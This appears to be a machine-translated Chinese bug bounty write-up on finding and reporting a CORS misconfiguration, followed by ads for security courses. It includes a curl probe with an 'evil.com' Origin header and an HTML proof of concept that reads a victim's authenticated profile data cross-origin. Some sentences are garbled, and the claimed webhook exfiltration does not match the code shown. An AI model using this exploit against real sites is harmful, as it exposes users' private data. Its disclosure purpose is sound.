#  我如何利用错误配置的 CORS 漏洞赚取 $$$   
haidragon  安全狗的自我修养   2025-05-28 23:06  
  
— 深入探讨跨域资源共享配置错误及其影响  
  
  
  
# 📌 简介  
  
在本文中，我将向您介绍如何在漏洞赏金目标上发现一个**CORS 配置错误漏洞**，并最终获得 $$$ 奖励。虽然 CORS 问题经常被忽视，但当它们与需要凭证的端点或敏感 API 数据结合时，可能会造成严重的安全风险。让我们深入了解我是如何发现、利用和报告此漏洞的，以及您如何也能做到。  
  
  
  
# 🔍 什么是 CORS？  
  
CORS（跨域资源共享）是一种浏览器机制，允许对位于给定域之外的资源进行受控访问。典型的配置错误可能会导致信任任意来源，或允许跨来源发送凭据（例如 Cookie 或令牌）。  
  
如果实施不当，CORS 可能会允许恶意网站从另一个域读取敏感数据，从而导致严重的隐私或安全问题。  
  
  
  
# 🧠 侦察兵  
  
我从基本的子域名枚举开始，遇到了一个有趣的全子域名：  
```
```  
  
我手动并使用curl和等工具测试了这个端点httpie，然后尝试使用Corsy和探测 CORS 错误配置curl。  
  
然后测试**Corsy**工具：  
  
python corsy.py -u https://www.target.com/user/profile  
  
  
  
  
这是我发送的测试**curl请求：**  
  
curl -I -H   
"Origin: https://evil.com"  
 https://www.target.com/user/profile  
  
我得到的答复是：  
  
Access-Control-Allow-Origin:  
  
https://evil.com  
  
Access-Control-Allow-Credentials:  
  
true  
  
检查**Burpsuite 的**请求和响应：  
  
  
  
  
  
检查**核**响应：  
  
  
  
  
💥**轰！**这下可是个危险信号了。  
  
  
  
# 🚩 为什么这很危险  
- 端点以Access-Control-Allow-Origin: https://evil.com动态方式响应。  
- Access-Control-Allow-Credentials: true已启用，这意味着**将发送 cookie 或授权标头**。  
- 当用户通过身份验证时，端点会返回**敏感的用户信息，如电子邮件、姓名和内部 ID 号。**  
这使得我能够编写一个**跨域 JavaScript 漏洞**，该漏洞可以托管在恶意域上以劫持经过身份验证的数据。  
  
  
  
  
那么如何利用这个 CORS 漏洞呢？想想看……！  
  
  
  
  
然后用 Google 搜索并找到**GitHub CORS PoC Generator**的帮助。  
  
只需转到**GitHub CORS PoC 生成器**，然后输入目标域端点并单击生成以弹出 json 格式的**CORS Exploit Success**。  
  
  
  
  
  
最后我很**高兴****CORS 漏洞利用成功**并获得了一些 Jusy**用户信息**  
  
  
  
  
  
  
  
**因此，检查 CORS 漏洞是否对我自己的域（或）攻击者的域有效**  
# 🧪 概念验证（PoC）  
  
我创建了一个简单的 HTML 页面：  
  
  
<!DOCTYPE   
html  
>  
  
<  
html  
>  
  
<  
head  
>  
<  
title  
>  
CORS PoC  
</  
title  
>  
</  
head  
>  
  
<  
body  
>  
  
  
<  
h1  
>  
CORS Exploit  
</  
h1  
>  
  
  
<  
button  
onclick  
=  
"exploit()"  
>  
Exploit  
</  
button  
>  
  
  
<  
pre  
id  
=  
"output"  
>  
</  
pre  
>  
  
  
<  
script  
>  
  
    function exploit() {  
  
      fetch("https://www.target.com/user/profile", {  
  
        method: "GET",  
  
        credentials: "include"  
  
      })  
  
      .then(res => res.text())  
  
      .then(data => {  
  
        document.getElementById("output").innerText = data;  
  
      });  
  
    }  
  
</  
script  
>  
  
</  
body  
>  
  
</  
html  
>  
  
一旦登录的受害者访问此页面，他们的个人资料数据就会被泄露到我的 webhook 中。这表明存在严重的隐私侵犯。  
  
**攻击者域名漏洞响应：**  
  
  
  
  
  
  
  
# 📬 报告和响应  
  
我提交了以下报告：  
- PoC HTML代码  
- 响应标头  
- 捕获敏感数据  
- 影响和 CORS 行为的解释  
几天之内，我收到了回复：**“已分类✅”。**  
不久之后——最棒的是——**一笔 $$$ 奖励**出现在我的收件箱中。  
  
  
  
# ✅ 最后的总结  
- CORS 漏洞可能会造成很大影响，尤其是Allow-Credentials: true。  
- 始终测试所有端点，即使它们看起来是“只读的”。  
- 将其与身份验证和 cookie 结合起来以达到最大效果。  
- Corsy使用诸如、或之类的工具curl进行检测。  
# 💡 专业提示  
- 寻找通配符来源或Origin标题的反映。  
- 请务必检查是否Access-Control-Allow-Credentials是true。  
- 验证敏感信息是否在没有适当的来源验证的情况下被泄露或处理。  
# 🎉 结论  
  
这是一个完美的例子，说明在漏洞赏金狩猎中，**关注细节和理解浏览器安全机制**会带来怎样的回报。永远不要低估 CORS！  
  
告诉我你的想法，或者在评论区分享你的 CORS 故事！👇  
祝你狩猎愉快！🔍💰  
  
我希望您很快就会喜欢这篇文章，并在下一篇文章中看到它。  
  
感谢您花时间阅读我的文章。  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQEREkjoibjFst4F2YTlvkRG4zW0h21TYuO94OrIGsD2aHGrUcUYiasibQS5AYJ4a95Ra3zIFIXQ4e8lkFA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQEREkjoibjFst4F2YTlvkRG4zW6iapnXQ3Wviaiaiap37xFRqNok6BymcTiacnk07OowXYFowAKYfa9zS6gSA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQEREkjoibjFst4F2YTlvkRG4zWiaJkE3jZRR7znMJDXAlibBzibYaGLMlVvsa1xhlQFyv3viaARicSIII7a9A/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
#   
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHWXCBzZk44eZOKvIGq0RZia2vfZVtmPodgjznTwlY7PXU40F5KQ8xiceJOhLktswpMhec0zQVz07Cw/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
rust语言全栈开发视频教程-第一季(2025最新)  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERFO4iaNJUiawzlicADlGjS6UCWtUt0Jaibcc4U8aM7H8pSmjNWZHzZC2ibEib1voX6Waqowyd0Mnfce48Hg/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERFO3lqcLOMSd2PQZ9GiblkFIKNw2LH9DMNEibhyxpUVNCd907wCN9NroUqTaJgquiapibArIRby4AGMoQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERFO3lqcLOMSd2PQZ9GiblkFIRnBhWWFJXdzp516ibYibQsicDCzfq1MicKGdv9os1l2nyDAVNSR8b5cPow/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
# 详细目录  
# mac/ios安全视频  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERFbBn3mydWukVkxb7u4ibpOneTvEKRymYhW9KMlUWP1RnaXLuZibvPMdGmrdWVV3AMJya9dNxszgOeA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
# QT开发底层原理与安全逆向视频教程  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERGLucgfllJsyUEFRxtnUNkLfUhNeUCnH7x8VtPq0Q2zxZBdhjqiaibsx0rIbaYWMuIibmk5QtNPzsOSw/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
linux文件系统存储与文件过滤安全开发视频教程(2024最新)  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHSM6Wk8NAEmbHHUS2brkROr9JOj6WZCwGz4gE4MlibULVefmhRw2dvJd8ZeYnDpRIm0AV1TmIsuEQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
linux高级usb安全开发与源码分析视频教程  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHCd9Qic4AAIQfFFD7Rabvry4pqowTdAw6HyVbkibwH5NjRTU4Mibeo4JbMRD3XplqCRzg4Kiaib3jchSw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
linux程序设计与安全开发  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERGoVibbKav1DpliaTJ9icDrosqXeWyaMRJdCVWEG0VYLDibSMwUP1L5r9XmLibGkEkSZnXjPD6mWgkib9lA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
- ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHhezg9PuKylWLTBfCjokEH4eXCW471pNuHpGPzUKCkbyticiayoQ5gxMtoR1AX0QS7JJ2v1Miaibv1lA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
- #   
  
-   
- windows网络安全防火墙与虚拟网卡（更新完成）  
  
- ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERE5qcRgQueCyt3U01ySnOUp2wOmiaFhcXibibk6kjPoUhTeftn9aOHJjO6mZIIHRCBqIZ1ok5UjibLMRA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
- windows文件过滤(更新完成)  
  
- ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHhezg9PuKylWLTBfCjokEHmvkF91T2mwk3lSlbG5CELC5qbib3qMOgHvow2cvl6ibicVH4KguzibAQOQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
- USB过滤(更新完成)  
  
- ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHhezg9PuKylWLTBfCjokEHv0vyWxLx9Sb68ssCJQwXngPmKDw2HNnvkrcle2picUraHyrTG2sSK7A/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
- 游戏安全(更新中)  
  
- ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHhezg9PuKylWLTBfCjokEHzEAlXtdkXShqbkibJUKumsvo65lnP6lXVR7nr5hq4PmDZdTIoky8mCg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
- ios逆向  
  
- ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHhezg9PuKylWLTBfCjokEHmjrTM3epTpceRpaWpibzMicNtpMIacEWvJMLpKKkwmA97XsDia4StFr1Q/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
- windbg  
  
- ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERECMA4FBVNaHekaDaROKFEibv9VNhRI73qFehic91I5dsr3Jkh6EkHIRTPGibESZicD7IeA5ocHjexHhw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
- 还有很多免费教程(限学员)  
  
-   
-   
-   
- windows恶意软件开发与对抗视频教程  
  
-   
- ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERFPap5AiahwlmRC2MGPDXSULNssTzKQk8b4K3pttYKPjVL4xPVu1WHTmddAZialrGo8nQB3dJfJvlZQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
- ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHYgfyicoHWcBVxH85UOBNaPMJPjIWnCTP3EjrhOXhJsryIkR34mCwqetPF7aRmbhnxBbiaicS0rwu6w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
-   
-   
